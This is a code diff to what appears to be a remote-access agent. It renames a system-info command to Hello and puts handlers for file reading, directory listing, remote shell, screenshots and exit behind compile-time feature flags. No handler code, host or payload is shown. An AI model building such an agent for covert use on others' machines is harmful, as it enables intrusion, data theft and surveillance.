@@ -8,8 +8,8 @@ static const CHAR *CommandTypeName(UINT8 type)
 {
     switch (type)
     {
-    case CommandType::Command_GetSystemInfo:
-        return "GetSystemInfo";
+    case CommandType::Command_Hello:
+        return "Hello";
     case CommandType::Command_GetDirectoryContent:
         return "GetDirectoryContent";
     case CommandType::Command_GetFileContent:
@@ -52,17 +52,39 @@ INT32 start()
     UINT32 connectionAttempt = 0;
 
     CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
-    commandHandlers[CommandType::Command_GetSystemInfo] = Handle_GetSystemInfoCommand;
+#if AGENT_SUPPORT_HELLO
+    commandHandlers[CommandType::Command_Hello] = Handle_HelloCommand;
+#endif
+#if AGENT_SUPPORT_GET_DIRECTORY_CONTENT
     commandHandlers[CommandType::Command_GetDirectoryContent] = Handle_GetDirectoryContentCommand;
+#endif
+#if AGENT_SUPPORT_GET_FILE_CONTENT
     commandHandlers[CommandType::Command_GetFileContent] = Handle_GetFileContentCommand;
+#endif
+#if AGENT_SUPPORT_GET_FILE_CHUNK_HASH
     commandHandlers[CommandType::Command_GetFileChunkHash] = Handle_GetFileChunkHashCommand;
+#endif
+#if AGENT_SUPPORT_WRITE_SHELL
     commandHandlers[CommandType::Command_WriteShell] = Handle_WriteShellCommand;
+#endif
+#if AGENT_SUPPORT_READ_SHELL
     commandHandlers[CommandType::Command_ReadShell] = Handle_ReadShellCommand;
+#endif
+#if AGENT_SUPPORT_GET_DISPLAYS
     commandHandlers[CommandType::Command_GetDisplays] = Handle_GetDisplaysCommand;
+#endif
+#if AGENT_SUPPORT_GET_SCREENSHOT
     commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
+#endif
+#if AGENT_SUPPORT_CLOSE_SHELL
     commandHandlers[CommandType::Command_CloseShell] = Handle_CloseShellCommand;
+#endif
+#if AGENT_SUPPORT_EXIT
     commandHandlers[CommandType::Command_Exit] = Handle_ExitCommand;
+#endif
+#if AGENT_SUPPORT_OPEN_SHELL
     commandHandlers[CommandType::Command_OpenShell] = Handle_OpenShellCommand;
+#endif
 
     LOG_INFO("Agent starting, registered %d command handlers", (INT32)CommandType::CommandTypeCount);
 
